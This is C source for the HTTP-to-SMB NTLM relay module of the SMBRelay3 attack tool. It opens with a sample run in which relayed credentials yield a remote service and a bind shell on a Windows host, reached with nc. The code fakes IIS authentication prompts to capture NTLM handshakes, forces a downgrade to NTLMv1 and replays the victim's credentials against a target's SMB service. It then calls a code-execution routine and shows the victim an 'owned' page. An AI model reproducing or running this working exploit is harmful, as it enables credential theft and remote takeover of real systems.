/*
    SMBRelay3 - HTTP REPLAY ATTACK MODULE
    -------------------------------------


C:\smbrelay>smbrelay3.exe --ListForHTTPRequests
[+] Accepted Connection - Replaying against 192.168.47.128
[+] Reading Initial HTTP Request...
[+] Sending Default HTTP 401 Error response and asking for authentiation NTLM
[+] Reading Second HTTP Request with Auhorization Header..
GET /test HTTP/1.1
[+] Authorization header received.
[+] Init HTTP to SMB attack - Connecting with: 192.168.47.128:445
Received SMB Message with NTLM v2 packet
Sending NTLM Challenge from SMB Server to the HTTP Client
Sending HTTP Response: HTTP/1.1 401 Access Denied
Received Final Authentication packet from remote HTTP Client
Trying to authenticate to remote SMB as Administrador
Sending Final SMB Authentication packet with NTLM Message type 3
SessionSetupAndX Completed. Authenticacion against 192.168.47.128 Succeed as Administrador
[+] Connecting against \\192.168.47.128\ipc$
[+] Trying to connect to admin$
[+] Creating Remote File smrs.exe under admin$
[+] Writing File smrs.exe into admin$ (2048 bytes)
[+] Opening Remote Service Control Manager pipe \svcctl
[*] Sending RPC BindRequest to SCM pipe
[*] Reading Response from Binding Request
[+] Opening Remote Service Control Manager (Creating Service)
[+] Creating Remote Service
[+] Opening Remote Service
[+] Starting Remote Service...
[+] *** Remote SmbRelay3 BindShell Service Running ***: (192.168.47.128:8080)


C:\smbrelay>nc 192.168.47.128 8080
Microsoft Windows 2000 [Versión 5.00.2195]
(C) Copyright 1985-2000 Microsoft Corp.

C:\WINNT\system32>

*/

#include "httprelay.h"
#include "payload.h"

extern int verbose;
extern int ProxySMB;

int HandleIncommingHTTPRequest(RELAY *relay, char *destinationhostname,int destinationport)
{
	char request[4096];
	int leido=0;
	int total=0;
	char **header;
	unsigned int nheaders=0;
	char *data;
    char *p;
	int i;
	char buf[4096];
	char buf1[4096];
	char buf2[4096];
	uint16 packetlen;
	smheader *SmbPacket1, *SmbPacket2, *SmbPacket3;
	smheader *NegotiateProtocol;
	char CurrentUserName[256];
	char CurrentDomain[256];
	char CurrentWorkstation[256];
	const uint8 SpoofedChallengeKey[]="\x11\x22\x33\x44\x55\x66\x77\x88";



	char InitialResponse[]=	"HTTP/1.1 401 Unauthorized\r\n"
							"Content-Length: 0\r\n"
							"Content-Type: text/html\r\n"
							"Server: Microsoft-IIS/6.0\r\n"
							"WWW-Authenticate: NTLM\r\n"
							"Connection: keep-alive\r\n\r\n";
	char owned[4096]="<html><title>smbrelay owning</title><body><h1>You have been owned by Smbrelay3</body></html>";

	memset(request,'\0',sizeof(request));
	total=ReadRequest(relay,(char*)&request,sizeof(request));
	if (total<=0) return(1);    
	printf("[+] Reading Initial HTTP Request...\r");
    CleanLine(verbose);
	if (verbose){
        printf("\n");
        if (debug) {
		    printf("\n%s\n",request);
        }
	}
	do {

	    printf("[+] Sending Default HTTP 401 Error response and asking for authentiation NTLM\r");
        CleanLine(verbose);
	    send(relay->source,InitialResponse,(int)strlen(InitialResponse),0);

	    memset(request,'\0',sizeof(request));
	    total=ReadRequest(relay,(char*)&request,sizeof(request));
	    if (total<=0) return(1);
        CleanLine(verbose);
	    printf("[+] Reading Second HTTP Request with Auhorization Header..\r");
	    header=ParseHeaders(request,&nheaders);
	    data=GetHeaderValue(header, nheaders, "Authorization: NTLM ") ;
	    if (!data) {
            if (verbose) printf("\n");
            if (debug) {
                CleanLine(verbose);
		        printf("[+]  Ooops! Authorization header missing\n");
                printf("%s\n",request);
		        return(0);
            }           
        } else {
            if (verbose) printf("\n%s\n",request);    
        }
    } while (!data);

	if (verbose) {
        CleanLine(verbose);
		printf("[+] Authorization header received.\n");
        if (debug) {
            printf("%s\n",data);
        }
	}

	if (!ProxySMB)
	{
        CleanLine(verbose);
	    printf("[+] Init HTTP to SMB attack - Connecting with: %s:%i\r",destinationhostname,destinationport);        
	    i=ConnectToRemoteHost(relay,destinationhostname,destinationport);
	    if (!i) {
            CleanLine(verbose);
		    printf("[-] Unable to connect to remote host %s:%i\r",destinationhostname,destinationport);
		    return(0);
	    }
        if (verbose) printf("\n");
	    printf("Sending SMB Authentication Handshake                                              \r");
        p = AddDialect(NULL,"PC NETWORK PROGRAM 1.0",0x02, &i);
        p = AddDialect(p,"LANMAN1.0", 0x02,&i);
        p = AddDialect(p,"Windows for Workgroups 3.1a", 0x02,&i);
        p = AddDialect(p,"LM1.2X002", 0x02,&i);
        p = AddDialect(p,"LANMAN2.1", 0x02,&i);
        p = AddDialect(p,"NT LM 0.12", 0x02,&i);
	    NegotiateProtocol=BuildSmbPacket(NULL,NEGOTIATEPROTOCOLREQUEST,0,p,i);
        free(p);
        i=SendBytesAndWaitForResponse(relay->destination,(char*)NegotiateProtocol,SmbPacketLen(NegotiateProtocol),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
        free(NegotiateProtocol);

	    if (i<=0){
		    printf("[-] Initial SMBHandShake (LanManager Negotiation) Failed                                \n");
            return(0);

	    }
	    memset(buf,'\0',sizeof(buf));

	    SmbPacket1=BuildSmbPacket1();
	    if (debug)  {
		    printf("\n[*]Dumping SMB Packet With NTLM Message Type 1                                  \n");
		    DumpMem((char*)SmbPacket1,SmbPacketLen(SmbPacket1));
	    }

	    SmbPacket2=GetSmbPacket2(relay,SmbPacket1);
	    if  (SmbPacket2==NULL) {
		    printf("Unable to receive SMB Packet with NTLM Message Type 2                  \n");
            return(0);
	    }
	    printf("Received SMB Message with NTLM v2 packet\n");
	    memcpy((char*)&packetlen,GetNTLMPacketFromSmbPacket(SmbPacket2)-4,2);
	    
        if (debug) {
		    printf("SMB Packet Dump:\n");
		    DumpMem((char*)SmbPacket2,SmbPacketLen(SmbPacket2));
		    printf("NTLM Challenge packet from SMB message\n");
		    DumpMem((char*)GetNTLMPacketFromSmbPacket(SmbPacket2),packetlen);
		    
		    
	    }
        if (verbose)
	    {
            printf("[+] Debug Information                                                             \n");
            dumpAuthChallenge(0,(tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2));
        }
        //HACK: Force NTLMv1 
        ((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2))->flags=0x0000b207;
        //((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2))->flags=0xA0003287;
	    to64frombits((unsigned char*)&buf1, (unsigned char*)GetNTLMPacketFromSmbPacket(SmbPacket2), packetlen);    
	} else {
        //TODO: Generar paquete Auth Challenge
		//BuildAuthChallenge((tSmbNtlmAuthChallenge *)buf, "SMBRELAY3","SERVERNAME", "SERVER","SERVER",0,(uint8*)&SpoofedChallengeKey);
		//to64frombits((unsigned char*)&buf1, (unsigned char*)buf,NtlmChallengeSize((tSmbNtlmAuthChallenge *)buf));
	}

	
	
	sprintf(buf,"HTTP/1.1 401 Access Denied\r\nServer: Microsoft-IIS/6.0\r\nWWW-Authenticate: NTLM %s\r\nContent-Length: 0\r\nContent-Type: text/html\r\n\r\n",buf1);

	printf("Sending NTLM Challenge from SMB Server to the HTTP Client\n");
	if (verbose)
	{
		printf("Sending HTTP Response: %s\n",buf);
	}
	send(relay->source,buf,(int)strlen(buf),0);
	
	total=ReadRequest(relay,(char*)&request,sizeof(request));
	if (total<=0) {
		printf("Error reading Final Authentication packet from HTTP Client\n");
		return(1);
	}
	printf("Received Final Authentication packet from remote HTTP Client\n");
	if(verbose)
	{
		printf("%s\n",request);
	}
	header=ParseHeaders(request,&nheaders);
	data=GetHeaderValue(header, nheaders, "Authorization: NTLM ") ;
	if (!data) {
		printf("Ooops! Authorization header missing\n");
		return(0);
	}

//	printf("lenght del hash3 ntlm: %i\n",strlen(data));
	memset((char*)&buf1,'\0',sizeof(buf1));
	packetlen=from64tobits(buf1, data);
	if (verbose) {
        if (debug) 
        {
		    printf("Raw authorization packet (len: %i)\n",packetlen);
		    DumpMem(buf1,packetlen+10);
        }
		dumpAuthResponse(0,(tSmbNtlmAuthResponse*)buf1);
	}
    if  ( ((tSmbNtlmAuthResponse*)buf1)->ntResponse.len != 24 )
    {
        printf("[-] Remote HTTP Client forced NTLMv2 Authentication\n");
        strcpy(request,"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
		send(relay->source,request,(int)strlen(request),0);
        return(0);
    }


	GetNTLMPacketInfo((tSmbNtlmAuthResponse*)buf1,(char*)&CurrentUserName, (char*)&CurrentDomain, (char*)&CurrentWorkstation,verbose);
	printf("Trying to authenticate to remote SMB as %s\n",CurrentUserName);
//A1
	//DumpMem(buf1,packetlen);
	
	buildAuthResponse((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2),(tSmbNtlmAuthResponse*)buf2,0,CurrentUserName,NULL,NULL,CurrentWorkstation, (tSmbNtlmAuthResponse*)buf1);
	
	
    SmbPacket3=BuildSmbPacket((smheader*)SmbPacket2,SESSIONSETUPANDX,0,buf2,(int)SmbLength((tSmbNtlmAuthResponse *)buf2));

	printf("Sending Final SMB Authentication packet with NTLM Message type 3                    \r");
    if (verbose) printf("\n");
	if (debug) 
	{
		DumpMem((char*)SmbPacket3, SmbPacketLen(SmbPacket3));
	}

    i=SendBytesAndWaitForResponse(relay->destination,(char*)SmbPacket3, SmbPacketLen(SmbPacket3),(char*)buf,sizeof(buf),SMBWAITTIMEOUT);
	if (i<=0){
		printf("[-] Error reading Server Authentication Response                         \n");
        return(0);

	}
	if (debug)  {
		printf("[-] SessionSetupAndX Completed - Dumping received packet                            \n");
		DumpMem(buf,i);
	}

	if (((smheader*)buf)->NtStatus!=0x00000000) {
		strcpy(request,"HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");
		send(relay->source,request,(int)strlen(request),0);
		printf("[-] SessionSetupAndX Completed. Authentication Failed                                \n");
		return(0);
	}
		
	//WriteDataToReportFile("log.txt", (tSmbNtlmAuthResponse*)buf1, destinationhostname,(unsigned char*)((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2))->challengeData);
	
	printf("SessionSetupAndX Completed. Authenticacion against %s Succeed as %s\r",destinationhostname,CurrentUserName);
    if (verbose) 
	{
		printf("\n");
		sprintf(owned,"<html><title>smbrelay III</title><body><h1>Dear %s\\%s<br></h1> Your credentials were replayed against %s and code execution succeed</body></html>",CurrentWorkstation,CurrentUserName,destinationhostname);
	//GetNTLMPacketInfo((tSmbNtlmAuthResponse*)buf1,(char*)&CurrentUserName, (char*)&CurrentDomain, (char*)&CurrentWorkstation,verbose);
	}

	sprintf(request,"HTTP/1.1 200 OK\r\nContent-Length: %i\r\nConnection: close\r\n\r\n%s",strlen(owned),owned);
	send(relay->source,request,(int)strlen(request),0);
	ExecuteCode( *relay);
    return(1);

}
int ReadRequest(RELAY *relay, char *request, int requestsize)
{
	int leido=0;
	int total=0;
	int EndOfRequest=0;
	do 
	{
		leido=recv( relay->source,request+total,requestsize-total,0 );
		total+=leido;
		EndOfRequest=(strcmp(request+total-4,"\r\n\r\n")==0);
	} while ( (!EndOfRequest) && (leido>0) );
	return(total);

}
/******************************/
char **ParseHeaders(char *lpBuffer, unsigned int *nheaders)
{
      char *next;
      char *current=lpBuffer;
	  char **header;
	  
	  header=NULL;
      *nheaders=0;

	if ( (!lpBuffer) ||(*lpBuffer=='\0') )
	{
		*nheaders=0;
		return(NULL);
	}
    do {
		
		next=strchr(current,'\n');
        header=(char **)realloc(header,sizeof(char*)*(*nheaders+1));
        if (next) {            
            next[0]='\0';
			if (*(next-1)=='\r') *(next-1)='\0';
         }
         header[*nheaders]=current;
		 *nheaders=*nheaders+1;
         if (!next) break;
         current=next+1;
	} while ((*current!='\r') && (*current!='\n') );
	return(header);
}
/******************************/
char *GetHeaderValue(char **header, int nheaders, char *Header) 
{	
	
	
   for(unsigned int i=1;i<(unsigned int)nheaders;i++)
   {
      if (_strnicmp(header[i],Header,strlen(Header))==0)
     {
		return(header[i] + strlen(Header));
      }
   }
   return(NULL);
   
}

